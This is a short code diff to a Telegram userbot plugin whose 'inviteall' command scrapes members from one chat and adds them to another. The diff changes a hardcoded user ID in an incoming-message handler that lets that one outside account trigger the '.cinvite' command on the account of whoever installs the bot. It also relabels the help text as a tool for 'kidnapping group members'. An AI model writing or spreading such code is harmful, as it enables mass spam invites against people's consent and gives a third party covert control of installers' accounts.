@@ -55,7 +55,7 @@ async def get_chatinfo(event):
 
 
 @skyzu_cmd(pattern="inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=2127265501, pattern=r"^\.cinvite(?: |$)(.*)")
+@register(incoming=True, from_users=860951678, pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
     me = await event.client.get_me()
@@ -95,7 +95,7 @@ async def get_users(event):
 
 CMD_HELP.update(
     {
-        "inviteall": f"𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}inviteall groups username`\
-          \n📌 : __Scrapes users from the given chat to your group__."
+        "inviteall": f"𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}inviteall username group`\
+          \n📌 : __Untuk Menculik Member Grup__."
     }
 )
